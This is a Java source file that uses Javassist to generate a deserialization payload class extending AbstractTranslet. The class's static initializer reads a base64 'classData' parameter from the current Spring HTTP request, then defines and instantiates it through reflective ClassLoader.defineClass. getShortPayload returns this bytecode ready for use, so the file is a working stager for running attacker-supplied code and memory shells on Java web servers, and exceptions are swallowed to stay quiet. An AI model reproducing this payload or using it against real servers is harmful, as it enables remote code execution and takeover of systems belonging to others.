package org.example;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

public class DynamicEvilGenerate {
    public static void main(String[] args) throws Exception {
        String cmd = "calc";
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass("MyClassLoader");
        CtClass superclass = classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        ctClass.setSuperclass(superclass);
        CtConstructor constructor = ctClass.makeClassInitializer();
        constructor.setBody("try{\n" +
                "            javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();\n" +
                "            java.lang.reflect.Field r = request.getClass().getDeclaredField(\"request\");\n" +
                "            r.setAccessible(true);\n" +
                "            String classData=request.getParameter(\"classData\");\n" +
                "            byte[] classBytes = new sun.misc.BASE64Decoder().decodeBuffer(classData);\n" +
                "            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\"defineClass\",new Class[]{byte[].class, int.class, int.class});\n" +
                "            defineClassMethod.setAccessible(true);\n" +
                "            Class cc = (Class) defineClassMethod.invoke(MyClassLoader.class.getClassLoader(), classBytes, 0,classBytes.length);\n" +
                "            cc.newInstance();\n" +
                "        }catch (Exception ignored){\n" +
                "        }");
        byte[] bytes = ctClass.toBytecode();
        //让这个类允许被修改,但是感觉在这里用处不大
        ctClass.defrost();

    }

    public static byte[] getShortPayload() throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass("MyClassLoader");
        CtClass superclass = classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        ctClass.setSuperclass(superclass);
        CtConstructor constructor = ctClass.makeClassInitializer();
        constructor.setBody("try{\n" +
                "            javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();\n" +
                "                java.lang.reflect.Field r = request.getClass().getDeclaredField(\"request\");\n" +
                "                r.setAccessible(true);\n" +
                "                String classData=request.getParameter(\"classData\");\n" +
                "                byte[] classBytes = new sun.misc.BASE64Decoder().decodeBuffer(classData);\n" +
                "                Class cc = (Class) ClassLoader.class.getDeclaredMethod(\"defineClass\",new Class[]{byte[].class, int.class, int.class}).invoke(MyClassLoader.class.getClassLoader(), classBytes, 0,classBytes.length);\n" +
                "                cc.newInstance();\n" +
                "        }catch (Exception ignored){\n" +
                "        }");
        byte[] bytes = ctClass.toBytecode();
        //让这个类允许被修改,但是感觉在这里用处不大
        ctClass.defrost();
        return bytes;
    }

}